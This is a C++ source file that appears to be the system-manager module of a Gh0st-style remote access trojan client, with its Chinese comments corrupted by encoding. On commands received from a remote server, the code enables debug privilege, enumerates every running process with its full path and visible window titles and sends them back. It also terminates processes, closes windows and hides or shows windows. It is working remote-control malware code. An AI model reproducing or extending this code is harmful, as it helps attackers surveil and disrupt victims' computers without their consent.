#include "stdafx.h"
#include "SystemManager.h"
#include "Common.h"
#include <TLHELP32.H>
#include <Psapi.h>

enum
{
	COMMAND_WINDOW_CLOSE,   //�رմ���
	COMMAND_WINDOW_TEST,    //��������
};
CSystemManager::CSystemManager(IOCPClient* ClientObject, BOOL bHow)
	: CManager(ClientObject)
{
	if (bHow == COMMAND_SYSTEM)
	{
		SendProcessList();
	}
	else if (bHow == COMMAND_WSLIST)
	{
		SendWindowsList();
	}
}


CSystemManager::~CSystemManager()
{
}

VOID CSystemManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		//��������
		case COMMAND_KILLPROCESS:
		{
			KillProcess((LPBYTE)szBuffer + 1, ulLength -1);
			break;
		}
		//�����б�
		case COMMAND_PSLIST:
		{
			SendProcessList();
			break;
		}
		case COMMAND_WSLIST:
		{
			SendWindowsList();
			break;
		}
		case COMMAND_WINDOW_CLOSE:
		{
			HWND hwnd = *(HWND*)(szBuffer + 1);
			::PostMessage(hwnd, WM_CLOSE, 0, 0);
			Sleep(100);
			SendWindowsList();
			break;
		}
		case COMMAND_WINDOW_TEST:
		{
			TestWindow(szBuffer + 1);
			break;
		}
		default:
			break;
	}
}

VOID CSystemManager::SendProcessList()
{
	
	
	LPBYTE szBuffer = GetProcessList();
	if (szBuffer == NULL)
	{
		return;
	}
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
	szBuffer = NULL;

	
}

VOID CSystemManager::SendWindowsList()
{
	LPBYTE szBuffer = GetWindowsList();
	if (szBuffer == NULL)
	{
		return;
	}
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);

}

LPBYTE CSystemManager::GetProcessList()
{
	//��Ȩ
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	HANDLE ProcessHandle = NULL;
	HANDLE SnapshotHandle = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//��������·��
	char szProcessFullPath[MAX_PATH] = { 0 };
	SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD dwOffset = 0;
	DWORD dwLength = 0;
	DWORD cbNeeded = 0;
	HMODULE hModule = NULL;
	//�����ڴ�
	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	//����ͷ
	szBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	//�������̿���
	
	if (Process32First(SnapshotHandle,&pe32))
	{
		do 
		{
			//����Ŀ�����ID�򿪽��̵Ľ��̾��
			ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
				FALSE, pe32.th32ProcessID);
			//ö�ٵ�һ��ģ�飨�Լ��������  
			EnumProcessModules(ProcessHandle, &hModule, sizeof(hModule), &cbNeeded);
			//��Ŀ���������·��
			DWORD dwReturn = GetModuleFileNameEx(ProcessHandle, hModule,
				szProcessFullPath,
				sizeof(szProcessFullPath));
			if (dwReturn == 0)
			{
				strcpy(szProcessFullPath, "�򿪽���ʧ�ܻ�ö����Ϣʧ��");
			}
			dwLength = sizeof(DWORD) +
				lstrlen(pe32.szExeFile) + lstrlen(szProcessFullPath) + 2;
			//��������̫С  ��������
			if (LocalSize(szBuffer) < (dwOffset + dwLength))
			{
				szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
					LMEM_ZEROINIT | LMEM_MOVEABLE);
			}
			//д�����Id
			memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
			dwOffset += sizeof(DWORD);
			//д�������
			memcpy(szBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile));
			dwOffset += lstrlen(pe32.szExeFile) + 1;
			//д���������·��
			memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath));
			dwOffset += lstrlen(szProcessFullPath) +1;

		} while (Process32Next(SnapshotHandle, &pe32));
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);  //��ԭ��Ȩ
	CloseHandle(SnapshotHandle);       //�ͷž�� 
	return szBuffer;
}

LPBYTE CSystemManager::GetWindowsList()
{
	LPBYTE szBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc,
		(LPARAM)&szBuffer);
	szBuffer[0] = TOKEN_WSLIST;
	return szBuffer;
}

BOOL CSystemManager::DebugPrivilege(const char * szName, BOOL bEnable)
{
	BOOL bResults = TRUE;
	HANDLE TokenHandle;
	TOKEN_PRIVILEGES TokenPrivileges;
	//����Tokenlingpa
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,&TokenHandle))
	{
		bResults = FALSE;
		return bResults;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, szName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(TokenHandle,  FALSE,&TokenPrivileges, sizeof(TOKEN_PRIVILEGES),
		NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResults = FALSE;
	}
	CloseHandle(TokenHandle);
	return bResults;
}

VOID CSystemManager::KillProcess(LPBYTE szBuffer, ULONG ulLength)
{
	HANDLE ProcessHandle = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	for (int i = 0;i < ulLength;i++)
	{
		//�ý��̾��
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(szBuffer + i));

		TerminateProcess(ProcessHandle, 0);
		CloseHandle(ProcessHandle);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);    //��ԭ��Ȩ
											 // ����Sleep�£���ֹ����
	Sleep(100);
}

VOID CSystemManager::TestWindow(LPBYTE szBuffer)
{
	DWORD Hwnd = 0;
	DWORD dHow = 0;
	memcpy((VOID*)&Hwnd, szBuffer, sizeof(DWORD));
	memcpy(&dHow, szBuffer + sizeof(DWORD), sizeof(DWORD));
	ShowWindow((HWND__*)Hwnd, dHow);
}

BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	DWORD dwProcessId = 0;
	LPBYTE szBuffer = *(LPBYTE*)lParam;

	char szTitle[1024] = { 0 };
	memset(szTitle, 0, sizeof(szTitle));

	GetWindowText(hWnd, szTitle, sizeof(szTitle));

	if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
	{
		return TRUE;
	}

	if (szBuffer == NULL)
	{
		szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
		
	}
	dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
	dwOffset = LocalSize(szBuffer);
	szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);

	memcpy((szBuffer + dwOffset), &hWnd, sizeof(DWORD));
	memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);

	*(LPBYTE *)lParam = szBuffer;
	return TRUE;

}
